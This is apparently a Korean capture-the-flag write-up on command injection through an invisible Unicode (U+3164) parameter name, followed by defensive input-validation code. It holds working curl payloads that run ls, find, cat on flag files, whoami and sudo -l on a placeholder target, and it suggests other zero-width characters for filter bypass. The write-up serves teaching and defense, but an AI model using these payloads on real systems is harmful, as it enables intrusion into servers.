# Command Injection via Invisible Unicode Parameter

## 취약점 개요

이 문제는 **Command Injection** 취약점을 **보이지 않는 유니코드 문자**를 이용해 우회하는 기법입니다.

## 기법 분석

### 1. 보이지 않는 유니코드 문자 활용
- **문자**: `ㅤ` (U+3164, Hangul Filler)
- **특징**: 시각적으로는 공백처럼 보이지만 실제로는 유효한 변수명
- **우회 원리**: 서버 측 필터링에서 놓치기 쉬운 문자

### 2. 서버 동작 방식
```javascript
// 서버 내부 로직 (추정)
const commands = [];
commands[choice] = request.body['ㅤ']; // 보이지 않는 변수명
executeCommand(commands[choice]);
```

### 3. 페이로드 구조
```
choice=6&ㅤ=<원하는_명령어>
```
- `choice=6`: 배열 인덱스 지정
- `ㅤ=<cmd>`: 보이지 않는 변수에 명령어 주입

## 풀이 과정

### Step 1: 기본 정보 수집
```bash
# 현재 디렉토리 파일 목록
curl -X POST http://target:port/server_status -d "choice=6&ㅤ=ls -al"

# 현재 작업 디렉토리
curl -X POST http://target:port/server_status -d "choice=6&ㅤ=pwd"

# 시스템 정보
curl -X POST http://target:port/server_status -d "choice=6&ㅤ=uname -a"
```

### Step 2: 플래그 탐색
```bash
# 플래그 파일 검색
curl -X POST http://target:port/server_status -d "choice=6&ㅤ=find / -name '*flag*' 2>/dev/null"

# 일반적인 플래그 위치 확인
curl -X POST http://target:port/server_status -d "choice=6&ㅤ=cat flag.txt"
curl -X POST http://target:port/server_status -d "choice=6&ㅤ=cat /flag"
curl -X POST http://target:port/server_status -d "choice=6&ㅤ=cat flag"
```

### Step 3: 권한 상승 (필요시)
```bash
# 현재 사용자 확인
curl -X POST http://target:port/server_status -d "choice=6&ㅤ=whoami"

# sudo 권한 확인
curl -X POST http://target:port/server_status -d "choice=6&ㅤ=sudo -l"
```

## 방어 기법

### 1. 입력 검증 강화
```javascript
// 유니코드 정규화 및 필터링
function sanitizeInput(input) {
    return input.normalize('NFKC')
                .replace(/[\u3164\u2000-\u200F\u202A-\u202E]/g, '')
                .replace(/[;&|`$(){}[\]]/g, '');
}
```

### 2. 화이트리스트 방식
```javascript
const allowedCommands = ['status', 'info', 'help'];
if (!allowedCommands.includes(userInput)) {
    throw new Error('Invalid command');
}
```

### 3. 파라미터명 검증
```javascript
const allowedParams = ['choice', 'action'];
Object.keys(requestBody).forEach(key => {
    if (!allowedParams.includes(key)) {
        throw new Error('Invalid parameter');
    }
});
```

## 학습 포인트

1. **보이지 않는 문자의 위험성**: 유니코드 문자 중에는 시각적으로 구분되지 않는 문자들이 많음
2. **필터링 우회 기법**: 기존 보안 필터를 우회하는 창의적 방법
3. **입력 검증의 중요성**: 모든 사용자 입력에 대한 철저한 검증 필요

## 추가 실습

비슷한 보이지 않는 문자들:
- `\u200B` (Zero Width Space)
- `\u200C` (Zero Width Non-Joiner) 
- `\u200D` (Zero Width Joiner)
- `\u2060` (Word Joiner)

이런 문자들도 변수명으로 사용해서 필터링 우회를 시도해볼 수 있어!